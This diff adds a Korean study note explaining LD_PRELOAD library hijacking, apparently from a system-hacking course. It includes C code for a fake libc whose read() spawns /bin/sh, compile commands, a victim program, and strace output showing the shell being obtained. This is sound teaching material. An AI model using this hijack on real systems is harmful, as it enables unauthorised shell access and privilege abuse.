@@ -1,0 +1,100 @@
+환경 변수 공격 - LD_PRELOAD :
+    LD_PRELOAD 환경 변수를 통해 로더가 프로세스에 로드할 라이브러리 파일을 지정할 수 있습니다.
+    프로그램에서 특정 함수를 호출하면 해당 환경 변수에 등록된 라이브러리 파일을 먼저 참조하여 호출된 함수를 찾게됩니다.
+
+    ex)
+        // gcc -o libc.so libc.c -fPIC -shared
+        #include <stdlib.h>
+        void read() {
+            execve("/bin/sh", 0, 0);
+        }
+
+    libc.c는 read 함수에서 execve("/bin/sh", 0, 0);를 실행하는 예제입니다.
+    해당 예제를 주어진 컴파일 옵션으로 컴파일하면 libc.so라는 공유 라이브러리 파일이 생성됩니다. 
+    만약 LD_PRELOAD 환경 변수에 생성한 공유 라이브러리 파일인 libc.so를 전달하면 모든 파일을 실행할 때 해당 파일을 참조하게 됩니다.
+
+    ex)
+        // gcc -o environ2 environ2.c 
+        #include <unistd.h>
+        #include <stdio.h>
+        int main()
+        {
+            char buf[16];
+            
+            setvbuf(stdout, 0, 2, 0);
+            setvbuf(stdin, 0, 2, 0);
+            write(1, "Data:", 5);
+            read(0, buf, sizeof(buf)-1);
+            
+            write(1, "GOOD", 4);
+                return 0;
+        }
+
+    environ2.c는 write 함수로 "Data:" 문자열을 출력한 뒤에 read 함수로 버퍼에 입력을 받고 다시 "GOOD" 문자열을 출력하는 예제입니다. 
+    다음은 해당 예제의 실행 결과입니다.
+    ex)
+        $ ./environ2
+        Data:1234
+        GOOD
+        $ strace -if ./environ2
+        [00007ffff7ad9777] execve("./environ2", ["./environ2"], [/* 19 vars */]) = 0
+        ...
+        [00007ffff7df22a7] open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+        ...
+        [00007ffff7b042c0] write(1, "Data:", 5Data:) = 5
+        [00007ffff7b04260] read(0, 1234
+        "1234\n", 15) = 5
+        [00007ffff7b042c0] write(1, "GOOD", 4GOOD)  = 4
+        [00007ffff7ad9748] exit_group(0)        = ?
+
+    environ2가 실행될 때 /lib/x86_64-linux-gnu/libc.so.6 라이브러리 파일을 로딩하여 write와 read 함수를 호출하는 것을 볼 수 있습니다. 
+    다음은 LD_PRELOAD 환경 변수에 libc.so를 전달하고 environ2를 실행한 결과입니다.
+    ex)
+        $ export LD_PRELOAD="./libc.so"
+        $ ./environ2
+        Data:# id
+        uid=1001(theori) gid=1001(theori) groups=1001(theori)
+        $ strace -if ./environ2
+        [00007ffff78d7777] execve("./environ2", ["./environ2"], [/* 20 vars */]) = 0
+        ...
+        [00007ffff7df22a7] open("./libc.so", O_RDONLY|O_CLOEXEC) = 3
+        ...
+        [00007ffff79022c0] write(1, "Data:", 5Data:) = 5
+        [00007ffff78d7777] execve("/bin/sh", NULL, NULL) = 0
+        ...
+
+    LD_PRELOAD 환경 변수에 전달된 libc.so 파일을 로딩한 것을 알 수 있고, read 함수가 호출될 때 execve 시스템 콜이 호출된 것을 확인할 수 있습니다.
+
+    libc.c에서 read 함수는 execve("/bin/sh", 0, 0);를 실행합니다.
+    LD_PRELOAD 환경 변수에 libc.so를 전달했기 때문에 environ2를 실행할 때
+    로더는 해당 환경 변수를 참조하여 /lib/x86_64-linux-gnu/libc.so.6 라이브러리 파일 대신 ./libc.so 파일을 로딩합니다.
+    environ2에서 read 함수를 호출하면 libc.so 라이브러리 파일에서 read 함수를 찾고 실행하게 되면서 셸을 획득할 수 있습니다.
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
